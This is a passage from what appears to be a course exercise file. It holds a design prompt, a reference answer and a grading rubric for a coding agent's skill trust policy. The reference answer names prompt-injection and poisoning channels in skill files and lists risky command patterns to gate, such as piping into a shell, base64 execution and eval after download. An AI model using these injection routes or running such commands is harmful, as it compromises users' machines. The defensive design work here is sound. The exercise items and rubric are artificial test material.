      let n = 0
      for (const _ of s) n++
      return n
    }

然后把四处 \`X.length <= budget\` 换成 \`myCpLen(X) <= budget\`（或直接用 \`cpLen\`）：阶段 1 的 \`text(full)\`、阶段 2 门槛和轮转里的 \`text(ks)\`、阶段 3 的 \`wrapCatalog(...)\`。\`full\` 不动。

Python 通道没有这个 bug：\`len(s)\` 本来就数码点（讲义第六节的 PyMirror）。这是双语言 lab 里少数 Python 天然更对的地方。`,
    },
    {
      id: 'design-trust-policy',
      kind: 'design',
      prompt:
        '为公司内部的 coding agent（在 L17 的 mini coding agent 上扩展）设计 skill 的加载与信任策略。说清楚：从哪里发现、同名谁赢、校验多严、目录怎么进上下文、激活和资源怎么读、脚本什么时候放行、写进 skill 目录怎么处理，以及你怎么知道这套策略在起作用。',
      scenario:
        'skill 有四个来源：① agent 自带的 builtin skill；② 公司 skill 仓库，安全组审核后同步到每台机器的 `/opt/company/skills`；③ 工程师自己的 `~/.agents/skills`，不少是从网上复制来的；④ 仓库里的 `.agents/skills` 和 `.claude/skills`——包括 monorepo 子包，也包括工程师随手 clone 的开源项目。现有 skill 很多是给 Claude Code 写的，带 `allowed-tools`，有的正文里还有 Claude Code 激活即执行的命令语法。agent 既在工程师本地跑，也在 CI 里无人值守地跑；模型 API 有前缀缓存，窗口 128K。',
      reference: `这题没有唯一答案。能区分「想过」和「没想过」的，是你有没有把下面这些策略**显式写成数据和规则**，而不是默认继承某一家客户端的行为。

## 一、发现：根、顺序、信任等级

四类根各自带 scope 和 trust：builtin 和 \`/opt/company/skills\`（当 enterprise）是可信的；\`~/.agents/skills\` 是 user；仓库根和 monorepo 子包是 project，**只有在可信仓库列表里才是 trusted**，随手 clone 的开源项目一律 \`project-untrusted\`。

发现过程要确定：遍历结果排序后再用，跳过 \`.git/\`、\`node_modules/\`，限制深度，不跟随指向根外的符号链接（D1、D2、D3、D6）。

## 二、解析与校验：作者侧严，运行时宽

frontmatter 用 YAML 子集，标量一律字符串，布尔字段只认 \`true\` / \`false\`。公司仓库的 CI 跑 strict：\`NAME_DIR_MISMATCH\`、\`UNKNOWN_FIELD\`、长度按码点超限都直接打回 PR。运行时跑 lenient：给 Claude Code 写的 skill 带的 \`when_to_use\` 之类字段留在 extra，非必需字段出错只告警；\`name\`、\`description\` 出错才跳过整个 skill（V5、V7、P7）。

## 三、先过滤信任，再合并同名

\`filterTrusted\` 在 \`resolveCollisions\` 之前（S1）。未信任的 skill **直接不出现在目录里**，而不是列出来再在激活时拒绝。

同名策略写成一张优先级表，并写进文档。一个合理的选择是 enterprise 最高（安全组审核过的版本不该被个人或仓库覆盖），其次 project（trusted）、user、builtin——但无论怎么排，要讲清楚它和 Claude Code（personal 胜 project）、指南（project 胜 user）都可能不同。胜出的是整条记录（C5），每次遮蔽留一条 Shadow 并在 UI 里能看到（C6）。公司仓库 CI 顺带查同名冲突，鼓励起不撞的名字。

## 四、目录进系统区，有自己的额度

L06 的 128K 预算表里系统区只有 3K；30 条中等长度的 description 就能吃掉它的八成。给目录一个显式额度（比如 Codex 的「窗口 2%」或一个固定字符数），超了走三阶段算法：全量 → 轮转截短带 \`…\` → 去 description 贪心省略并告警（K5–K7）。预算按码点算（K8），输出是内容的纯函数（K4），这样前缀缓存跨会话、跨用户都稳定。

目录在会话开始时定下，放在 system prompt 里；会话中途新增的 skill 作为一条消息追加在末尾，或者下一个会话再生效——改前缀的代价是整段历史重新写缓存（2.5 的算例：五万多对四千多）。

## 五、激活与资源

- 激活工具是常量，\`name\` 是普通字符串，不用 enum；名字不对时返回排序后的合法名列表（A2、A6）
- 返回去掉 frontmatter、被 \`<skill_content>\` 包裹的正文；资源只列路径不读内容；同一会话第二次激活只回一句提示（A1、A4、A5）
- 资源读取每个 skill 一个只读子根，走 \`safePath(skill.dir, rel, true)\`，拒绝 \`..\`、绝对路径和符号链接逃逸（R2–R4）；不为了读用户 skill 去放宽 workspace 根
- 压缩时激活过的正文要钉住：每个 5,000、合计 25,000、最近的优先（A7），并告诉作者把最重要的指令放在前面

## 六、脚本：allowed-tools 只是一个输入

- \`project-untrusted\` 的 skill 任何命令都 deny（S3）
- \`allowed-tools\` 只对 builtin、enterprise 直接生效；user 和 trusted project 的 skill 要在第一次运行时由人批准，并记下目录哈希
- 匹配是精确的：全等或「前缀加空格」，含 shell 元字符一律不算命中（S2）
- 危险模式（管道进 shell、base64 执行、\`npx\` / \`uvx\` 拉远程包、下载后 eval）即使预批准也要问（S5）
- 目录哈希和批准时不同就重新问（S4）——\`references/\` 里改一个字节也算
- Claude Code 那种激活即执行的命令语法：不实现预执行，当普通文本交给模型，让它走正常的审批
- CI 里没有人可问：ask 一律当 deny，CI 只加载 builtin 和 enterprise skill

## 七、安装与供应链

公司仓库的审核看**整个目录**：SKILL.md 正文（ClawHavoc 的载荷在「前置条件」一节）、\`references/\`（以工具结果身份进上下文的注入通道）、\`scripts/\`，以及正文里让人或模型去 \`npx\` / \`uvx\` 拉的外部包——要求钉版本或内置。按发布者账号处置，而不只是按 skill：大规模投毒往往集中在少数账号。

## 八、写进 skill 目录 = 安装

把 \`isSkillPath\` 加进 L17 的 \`HIGH_RISK\` 判断，请求路径和解析后路径两头都查（S6）。agent 写 skill 目录要人确认；热重载只在会话边界生效，或者新 skill 在被人批准之前不进目录。否则一次被注入诱导的写入，下一轮就是一个由攻击者写 description 的新 skill。

## 九、怎么知道它在起作用

- 记录每个 skill 的激活率：几乎每次都激活的，迁进 AGENTS.md（实验六：第 1 轮激活是常驻的 103%）；从不激活的，查 description 或删掉
- 触发评测：约 20 条查询，必须包含 near-miss 负例，每条跑多于 3 次；报告写成「首动作触发率」并带 N，不要写成「触发率 X%」（3 次乘 0.5 的协议区分不了 0.6 和 0.4）
- 遮蔽记录、阶段 2/3 告警、被 deny 的命令都进日志，能被看到
- 内部报告引用安全数字时写清分子：0.16%、26.1%、超过 90% 量的是三件不同的事`,
      rubric: [
        '你有没有给每类来源标上 scope 和 trust，并把随手 clone 的仓库定为未信任？',
        '你有没有区分作者侧 strict（公司仓库 CI）和运行时 lenient，并说明为什么要两个函数而不是一个开关？',
        '你有没有把信任过滤放在同名合并之前，并让未信任的 skill 不出现在目录里？',
        '你的同名策略是不是显式的、写成数据的，有没有说明它和 Claude Code、指南的差异，并记录每次遮蔽？',
        '你有没有给目录在 L06 的系统区里切出显式额度，用确定性的、按码点计的预算算法，并处理会话中途新增 skill 对前缀缓存的影响？',
        '你有没有把 allowed-tools 当作预批准而不是限制：未信任 deny、精确匹配、危险模式照问、目录哈希钉住，以及 CI 里 ask 怎么处理？',
        '你有没有让资源读取走每个 skill 的只读子根，而不是放宽 workspace 根？',
        '你的安装审核有没有覆盖 SKILL.md 正文和 references/，而不只是 scripts/？',
        '你有没有把写进 skill 目录当作高危操作（isSkillPath 接进 HIGH_RISK），并给热重载定了规则？',
        '你有没有可观测性：激活率驱动「迁进 AGENTS.md」的决策、带 near-miss 负例和足够重复次数的触发评测、引用数字时写清分子？',
      ],
    },
  ],
}
